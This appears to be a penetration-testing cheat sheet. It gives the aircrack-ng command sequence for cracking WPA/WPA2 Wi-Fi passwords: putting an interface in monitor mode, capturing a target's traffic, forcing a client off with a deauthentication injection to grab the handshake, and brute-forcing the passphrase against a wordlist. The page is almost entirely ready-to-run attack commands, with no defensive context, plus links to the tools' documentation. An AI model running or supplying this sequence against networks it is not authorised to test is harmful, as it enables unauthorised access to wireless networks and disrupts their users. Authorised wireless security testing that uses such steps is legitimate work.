# Aircrack-ng (WPA/WPA2)

Using just the `aircrack-ng` suite of tools to crack the secret.

## Commands

* Run [setup](../../setup.md) first

```bash
# Start monitor mode
sudo airmon-ng start $INTERFACE

# Start monitor mode but with filters and output saved to PCAP.
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE

# Do one deauth injection attack while still monitoring
sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for the four-way handshake to appear in airodump-ng window.
# Stop airodump-ng when it appears
qq

# Crack the password
sudo aircrack-ng -w $WORDLIST -b $BSSID -e $SSID $PCAP
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
